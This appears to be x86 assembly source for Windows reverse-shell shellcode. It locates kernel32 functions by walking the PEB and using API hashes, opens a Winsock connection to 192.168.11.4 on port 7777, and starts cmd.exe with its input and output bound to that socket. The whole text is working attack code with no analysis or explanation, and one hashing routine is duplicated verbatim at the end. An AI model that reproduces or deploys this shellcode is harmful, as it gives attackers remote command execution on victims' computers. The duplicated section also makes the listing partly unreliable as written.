; ly0n.me
mov eax, 646d6301h
sar eax, 08h
push eax ; cmd. to stack for later use
 
; Resolve Kernel32 Functions
; push array of hashes in stack
push 74776072h ; LoadLibraryA
push 48269992h ; GetModuleHandle
push 0E553E06Fh ; GetProcAddress
push 0F390B59Fh ; CreateProcessA
push 0C3F39F16h ; ExitProcess
call find_kernel32 ; Resolve kernel 32

mov ebp, eax ; store kernel base addr
xor ecx, ecx ; zero ecx for counter
mov esi, 14h ; array size
mov edx, esp ; save esp addr

; loop through all pieces of array
loadhash:
mov ebx, [esp + ecx]
add esp, 18h
add esp, ecx

add esp, 16h
push ebp ; save registers
push ecx
push esi
push edx

call find_function_kernel32

pop edx ; restore registers
pop esi
pop ecx
pop ebp
sub esp, 16h

mov [esp – 18h ], eax ; converts hash of function to function address

mov esp, edx ; restore esp
add cl, 4h
cmp ecx, esi
jne loadhash

; start working with winsock
push 00006C6Ch ; we push winsock lib name in stack
push 642E3233h
push 5F327377h
mov edi,esp
push edi
call eax ; winsock library loaded
mov esi, eax ; save winsock handle in esi
push 00007075h
push 74726174h
push 53415357h ; push WSASTART in stack
mov edi, esp
push edi ; parameter 1
push esi ; parameter 2

mov edx, [esp + 28h] ; call getprocaddress of wsastartup
mov ebx, edx
call edx ; make call efective

mov ecx, eax ; wsastartup addr -> ecx
mov eax, 0190h ; socket struct size
sub esp, eax ; adjusting the stack
push esp ; parameter 1
push eax ; parameter 2
call ecx ; we got windows socket ready to initialize

mov eax, ebx ; getprocaddress eax
push 00004174h ; WSASocket
push 656b636fh
push 53415357h
mov edi, esp
push edi ; parameter 1
push esi ; parameter 2
call eax ; WSASocket in EAX

xor edx, edx ; zero ecx
push edx ; push parameters of WSASocket to stack
push edx
push edx
push edx
inc edx
push edx
inc edx
push edx
call eax ; create a valid socket file descriptor -> eax

mov ebp, eax ; save file descriptor in eax
push 00746365h ; connect function
push 6e6e6f63h
mov edi, esp
push edi ; push parameters
push esi
call ebx ; call getprocaddress

push 040BA8C0h ; 192.168.11.4 in network byte order
mov edx, 611E0102h ; 7777 in network byte order
dec dh
push edx
mov ecx, esp
xor edx, edx
mov dl, 10h
push edx ; push parameters
push ecx
push ebp ; ebp contains socket file descriptor
call eax

nop
xor ecx, ecx ; allocate space in stack for startupInfo data structure
mov cl, 54h
sub esp, ecx
mov ebx, esp
push ebx
xor eax, eax
rep stosb ; create a proper buffer for data structures
pop edi
add edi, 5Ch ; adjust the stack
mov byte ptr[edi], 44h
inc byte ptr [edi + 2dh]
push edi
mov eax, ebp
lea edi, [edi + 38h]
stosd
stosd
stosd
pop edi
xor eax, eax
lea esi, [edi + 44h] ; size of struct
push esi ; push parameters
push edi
push eax
push eax
push eax
inc eax
push eax
dec eax
push eax
push eax
mov edi, esp
add edi, 24Ch ; cmd. in the stack
push edi
push eax
nop
mov eax, [esp + 244h] ; createprocess in the stack
call eax
mov eax, [esp + 218h] ; load exitprocess
call eax ; bye bye P-)

;find kernel 32
find_kernel32:
push esi ;save ESI reg
xor eax, eax ; 0 eax
mov eax, fs:[eax+30h] ; PEB
mov eax, [eax + 0ch] ; calculate addr
mov esi, [eax + 1ch] ;  
lodsd ; calculo
mov eax, [eax + 8h] ; eax = kernel32 base addr
pop esi ; restore ESI
ret ; ret with base addr

;find function in kernel 32 ; ebp =  kernel32 base ; ebx = function hash
find_function_kernel32:
xor ecx,ecx
mov edi,dword ptr ss:[ebp+3ch]
mov edi,dword ptr ss:[ebp+edi+78h]
add edi,ebp
next_function_pointer:
mov edx,dword ptr ds:[edi+20h]
add edx,ebp
mov esi,dword ptr ds:[edx+ecx*4]
add esi,ebp
xor eax,eax
cdq
hash_next_byte:
lods byte ptr ds:[esi]
ror edx,0dh
add edx,eax
test al,al
jnz short hash_next_byte
inc ecx
cmp edx,ebx
jnz short next_function_pointer
dec ecx
mov ebx,dword ptr ds:[edi+24h]
add ebx,ebp
mov cx,word ptr ds:[ebx+ecx*2h]
mov ebx,dword ptr ds:[edi+1ch]
add ebx,ebp
mov eax,dword ptr ds:[ebx+ecx*4h]
add eax,ebp
ret;find function in kernel 32 ; ebp =  kernel32 base ; ebx = function hash
find_function_kernel32:
xor ecx,ecx
mov edi,dword ptr ss:[ebp+3ch]
mov edi,dword ptr ss:[ebp+edi+78h]
add edi,ebp
next_function_pointer:
mov edx,dword ptr ds:[edi+20h]
add edx,ebp
mov esi,dword ptr ds:[edx+ecx*4]
add esi,ebp
xor eax,eax
cdq
hash_next_byte:
lods byte ptr ds:[esi]
ror edx,0dh
add edx,eax
test al,al
jnz short hash_next_byte
inc ecx
cmp edx,ebx
jnz short next_function_pointer
dec ecx
mov ebx,dword ptr ds:[edi+24h]
add ebx,ebp
mov cx,word ptr ds:[ebx+ecx*2h]
mov ebx,dword ptr ds:[edi+1ch]
add ebx,ebp
mov eax,dword ptr ds:[ebx+ecx*4h]
add eax,ebp
ret